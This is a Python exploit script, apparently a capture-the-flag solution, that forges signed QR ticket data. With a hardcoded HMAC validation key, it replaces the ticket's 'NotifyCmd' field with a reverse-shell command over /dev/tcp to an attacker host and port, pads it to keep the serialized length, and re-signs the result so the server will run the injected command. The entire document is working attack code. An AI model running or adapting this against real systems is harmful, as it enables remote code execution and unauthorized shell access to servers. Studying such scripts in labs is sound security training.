from pathlib import Path
import base64
import hashlib
import hmac
import json

lhost = "10.10.14.43"   # replace this
lport = 4444            # replace this

key = b"JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR" #ticket_validation_key
command = f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1".encode()

qr = Path("qr.txt").read_text().strip()
raw = base64.b64decode(qr)
payload, signature = raw[:-32], raw[-32:]
assert hmac.compare_digest(signature, hmac.new(key, payload, hashlib.sha256).digest())

start = payload.index(b'{"PNR":')
end = payload.index(b"}", start) + 1
ticket = json.loads(payload[start:end])
old = ticket["NotifyCmd"].encode()
print(f"NotifyCmd: {len(old)} bytes; replacement: {len(command)} bytes")
assert len(command) <= len(old)
# Preserve the byte-slice length stored by Gob.
replacement = command.ljust(len(old), b" ")
assert payload.count(old) == 1

forged_payload = payload.replace(old, replacement, 1)
forged_signature = hmac.new(key, forged_payload, hashlib.sha256).digest()
print("qr_data=" + base64.b64encode(forged_payload + forged_signature).decode())
